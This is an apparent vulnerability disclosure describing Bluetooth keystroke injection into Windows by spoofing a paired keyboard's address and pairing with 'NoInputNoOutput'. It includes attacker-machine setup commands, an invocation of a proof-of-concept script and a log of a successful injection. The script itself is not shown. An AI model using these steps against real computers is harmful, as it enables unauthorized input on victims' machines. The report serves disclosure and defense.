## Overview

A physically-proximate attacker can inject keystrokes into a Windows computer over unauthenticated Bluetooth.

The Windows computer must be paired with a Bluetooth keyboard, and the keyboard must be switched off (or out of range).

An attacker, using an Ubuntu computer and Broadcom-based Bluetooth adapter, spoofs the address of the target keyboard and connects to L2CAP 17 on the Windows computer, while specifying the `NoInputNoOutput` SSP pairing-capability.

The victim sees a notification reading `Add a device` `Tap to set up your <Keyboard Name>`.

If they ignore the notification, nothing happens.

If they click on the notification, they are presented with a Bluetooth pairing-request dialog.

If the victim has the "Add a Bluetooth device" UI open, they will not see a notification, and will instead be immediately presented with the pairing-request as a modal dialog.

The attacker can complete pairing once the pairing-request dialog closes, even if the user clicks `Cancel` or `X`. Once pairing completes, the attacker connects to L2CAP 17 (HID Control).

The attacker then connects to L2CAP 19 (HID Interrupt), and is able to inject arbitrary keystrokes.

## Proof of Concept

The attached `windows-poc.py` demonstrates a keystroke-injection attack, and is intended to be run on an Ubuntu 22.04 computer using a Broadcom-based Bluetooth adapter.

I have found this adapter to work reliably: https://www.amazon.com/Kinivo-USB-Bluetooth-4-0-Compatible/dp/B007Q45EF4/

Starting from a clean Ubuntu 22.04 install, the attacker machine can be provisioned as follows:

```
sudo apt-get update && sudo apt-get -y upgrade

# install dependencies
sudo apt install -y bluez-tools bluez-hcidump git \
                    python3-pip python3-setuptools \
                    libbluetooth-dev

# configure bluetoothd to run in compatibility mode to support sdptool
sudo sed -i "s|ExecStart=/usr/lib/bluetooth/bluetoothd|ExecStart=/usr/lib/bluetooth/bluetoothd --compat|g" /lib/systemd/system/bluetooth.service
sudo systemctl daemon-reload
sudo systemctl restart bluetooth

# install pybluez
git clone https://github.com/pybluez/pybluez.git
cd pybluez
sudo python3 setup.py install
python3 -m pip install pydbus

# build bdaddr from bluez
cd ~
git clone https://github.com/bluez/bluez.git
cd bluez
gcc -o bdaddr tools/bdaddr.c src/oui.c -lbluetooth -I.
sudo cp bdaddr /usr/local/bin/
```

## Running the PoC

1. Pair a Bluetooth keyboard to the target Windows-computer, and turn off the keyboard
2. On the Ubuntu computer, run the PoC: `./windows-poc.py -i <Interface> -k <Keyboard-Address> -c <Windows-Address>`
3. Click on the notification when it appears on the Windows computer
4. Close the pairing-request dialog (or click `Cancel` or `Approve`)
5. If successful, the Ubuntu machine will connect to the Windows machine and inject a nondestructive payload of `tab` keypresses for 5 seconds

## LMP Race Condition

There is a race condition during link-establishment where both the Ubuntu and Windows computers attempt to enable link-encryption at the same time. Pairing usually completes within 1-2 seconds, but it may take as long as 15-30 seconds.

The race condition can be mitigated with a small patch to `hci_event.c` in the attacker's kernel; I am happy to share further details if this would be helpful.

## Example PoC Invocation

```
$ ./windows-poc.py -i hci0 -k 3C:A6:F6:EC:5B:ED -c 04:33:C2:19:CD:3B
Manufacturer:   Broadcom Corporation (15)
Device address: 12:34:56:78:9A:BC
New BD address: 3C:A6:F6:EC:5B:ED

Address changed - Reset device now
HID keyboard service registered
'NoInputNoOutput' pairing-agent running
Set Secure Simple Pairing for hci1 failed with status 0x11 (Invalid Index)
connecting to PSM 17
error connecting to PSM 17: [Errno 13] Permission denied
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 13] Permission denied
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 13] Permission denied
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 13] Permission denied
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
error connecting to PSM 17: [Errno 12] Cannot allocate memory
connecting to PSM 17
successfully connected to PSM 17 (HID Control)
connecting to PSM 19
successfully connected to PSM 19 (HID Interrupt)
injecting 5 seconds of 'tab' keypresses
Manufacturer:   Broadcom Corporation (15)
Device address: 3C:A6:F6:EC:5B:ED
New BD address: 12:34:56:78:9A:BC

Address changed - Reset device now
```
